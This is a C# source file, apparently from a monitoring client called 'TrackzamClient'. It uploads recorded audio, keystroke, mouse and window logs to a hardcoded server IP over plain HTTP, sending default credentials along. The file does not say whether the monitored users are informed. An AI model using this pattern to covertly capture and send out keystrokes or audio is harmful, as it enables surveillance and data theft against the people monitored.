using System;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Flurl.Http;
using Flurl.Util;

namespace TrackzamClient
{
    public class DataSender
    {
        public static void SetIPAdress(string ipAddress)
        {
            _ipAddress = ipAddress;
        }
        public static void SendAudioLogs(string path)
        {
            SendFileAsync("send_audio_logs", path);
        }
        
        public static void SendKeyboardLogs(string path)
        {
            SendFileAsync("send_keyboard_logs", path);
        }
        
        public static void SendMouseLogs(string path)
        {
            SendFileAsync("send_mouse_logs", path);
        }
        
        public static void SendWindowLogs(string path)
        {
            SendFileAsync("send_window_logs", path);
        }
        
        private static async void SendFileAsync(string type, string path)
        {
            await Task.Run(() =>
            {
                HttpWebRequest requestToServerEndpoint = 
                    (HttpWebRequest)WebRequest.Create(new StringBuilder().Append("http://")
                        .Append(_ipAddress).Append(":8000/api/").Append(type).ToString());

        
                string boundaryString = "----SomeRandomText";
                string fileUrl = path;
                
                requestToServerEndpoint.Method = WebRequestMethods.Http.Post;
                requestToServerEndpoint.ContentType = "multipart/form-data; boundary=" + boundaryString;
                requestToServerEndpoint.KeepAlive = true;
                requestToServerEndpoint.Credentials = System.Net.CredentialCache.DefaultCredentials;

                MemoryStream postDataStream = new MemoryStream();
                StreamWriter postDataWriter = new StreamWriter(postDataStream);
                
                postDataWriter.Write("\r\n--" + boundaryString + "\r\n");
                postDataWriter.Write("Content-Disposition: form-data;"
                                     + "name=\"{0}\";"
                                     + "filename=\"{1}\""
                                     + "\r\nContent-Type: {2}\r\n\r\n",
                    "file",
                    Path.GetFileName(fileUrl),
                    Path.GetExtension(fileUrl));
                postDataWriter.Flush();
                
                FileStream fileStream = new FileStream(fileUrl, FileMode.Open, FileAccess.Read);
                byte[] buffer = new byte[1024];
                int bytesRead = 0;
                while ((bytesRead = fileStream.Read(buffer, 0, buffer.Length)) != 0)
                {
                    postDataStream.Write(buffer, 0, bytesRead);
                }
                fileStream.Close();
     
                postDataWriter.Write("\r\n--" + boundaryString + "--\r\n");
                postDataWriter.Flush();
                
                requestToServerEndpoint.ContentLength = postDataStream.Length;

                using (Stream s = requestToServerEndpoint.GetRequestStream())
                {
                    postDataStream.WriteTo(s);
                }

                while (!requestToServerEndpoint.HaveResponse)
                {
                    Thread.Sleep(1000);
                }
                Console.WriteLine(requestToServerEndpoint.GetResponse().Headers);
                postDataStream.Close();
            });
        }

        private static string _ipAddress = "34.71.243.7";
    }
}